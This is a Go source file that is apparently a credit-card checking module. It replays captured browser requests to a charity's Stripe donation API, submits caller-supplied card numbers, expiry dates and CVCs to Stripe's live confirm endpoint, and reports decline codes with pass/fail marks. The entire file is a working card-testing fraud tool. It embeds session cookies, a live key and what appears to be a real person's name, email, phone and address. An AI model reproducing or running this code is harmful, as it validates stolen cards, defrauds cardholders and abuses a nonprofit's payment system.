package modules

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
)

func get_id() string {
	client := &http.Client{}
	var data = strings.NewReader(`{"email":"amarnathc@outlook.in","account":"us","testMode":false}`)
	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/list-customers", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "yaqeeninstitute.ca")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("content-type", "application/json")
	req.Header.Set("accept", "*/*")
	req.Header.Set("origin", "https://yaqeeninstitute.ca")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("cookie", "_country=ca; __stripe_mid=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e; __stripe_sid=6c0ab791-b55b-4969-b556-9aca59adccd76700f0; _dd_s=rum=2&id=cf9a4009-905f-4ed5-9ceb-520145961f64&created=1643549618780&expire=1643552535734&logs=1")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var m = make(map[string]interface{})
	json.NewDecoder(resp.Body).Decode(&m)
	if err != nil {
		log.Fatal(err)
	}
	id := m["data"].([]interface{})[0].(map[string]interface{})["id"].(string)
	return id

}

func update_id(id string) string {
	fmt.Println(id)
	client := &http.Client{}
	var data = strings.NewReader(`{"paymentIntentId":"pi_3KNdcxJAcVRgqCLO1dhvJpZh","account":"us","testMode":false,"data":{"metadata":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button","payment_method":"cc"},"customer":"cus_L3lajozOIcucpi"}}`)
	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/update-payment-intent", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "yaqeeninstitute.ca")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("content-type", "application/json")
	req.Header.Set("accept", "*/*")
	req.Header.Set("origin", "https://yaqeeninstitute.ca")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("cookie", "_country=ca; __stripe_mid=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e; __stripe_sid=6c0ab791-b55b-4969-b556-9aca59adccd76700f0; _dd_s=rum=2&id=cf9a4009-905f-4ed5-9ceb-520145961f64&created=1643549618780&expire=1643552536796&logs=1")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var m map[string]string
	if err != nil {
		log.Fatal(err)
	}
	json.NewDecoder(resp.Body).Decode(&m)
	return m["clientSecret"]
}

func confirm(id string, cc string, year string, month string, cvc string) (string, string, string) {
	client := &http.Client{}
	var data = strings.NewReader(`receipt_email=devnull%40yaqeeninstitute.org&payment_method_data[type]=card&payment_method_data[metadata][designation]=general&payment_method_data[metadata][donation_type]=One-Time&payment_method_data[metadata][amount_without_fee]=73&payment_method_data[metadata][int_source]=yaqeeninstitute.org&payment_method_data[metadata][int_campaign]=general&payment_method_data[metadata][int_content]=main_nav_donate_button&payment_method_data[metadata][payment_method]=cc&payment_method_data[billing_details][name]=Jenna+M+Ortega&payment_method_data[billing_details][phone]=%2B1+9402197942&payment_method_data[billing_details][email]=amarnathc%40outlook.in&payment_method_data[billing_details][address][line1]=394+Olen+Thomas+Drive&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=Crowell&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=79227&payment_method_data[billing_details][address][state]=TX&payment_method_data[card][number]=` + cc + `&payment_method_data[card][cvc]=` + cvc + `&payment_method_data[card][exp_month]=` + month + `&payment_method_data[card][exp_year]=` + year + `&payment_method_data[guid]=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&payment_method_data[muid]=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e&payment_method_data[sid]=6c0ab791-b55b-4969-b556-9aca59adccd76700f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7050ff317%3B+stripe-js-v3%2F7050ff317&payment_method_data[time_on_page]=1967550&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_tGDwiUeDEcgPGTyb51bqDNG8&client_secret=` + update_id(id))
	fmt.Println(data)
	req, err := http.NewRequest("POST", "https://api.stripe.com/v1/payment_intents/pi_3KNdcxJAcVRgqCLO1dhvJpZh/confirm", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "api.stripe.com")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("accept", "application/json")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("origin", "https://js.stripe.com")
	req.Header.Set("sec-fetch-site", "same-site")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://js.stripe.com/")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var x mapType
	json.NewDecoder(resp.Body).Decode(&x)
	if err != nil {
		log.Fatal(err)
	}
	code, dcode, msg := "", "", ""
	if e, ok := x["error"]; ok {
		e := e.(map[string]interface{})
		if c, ok := e["code"]; ok {
			code = c.(string)
		}
		if d, ok := e["decline_code"]; ok {
			dcode = d.(string)
		}
		if m, ok := e["message"]; ok {
			msg = m.(string)
		}
	}
	return code, dcode, msg
}

func StripeRs(cc string, month string, year string, cvc string) string {
	fmt.Println(year)
	id := get_id()
	code, dcode, msg := confirm(id, cc, month, year, cvc)
	emoji := "❌"
	if code != "card_declined" {
		emoji = "✅"
	}
	F := fmt.Sprintf(stripe_rs, cc, month, year, cvc, strings.ToUpper(code), emoji, dcode, msg, ".", "Free User")
	return F
}
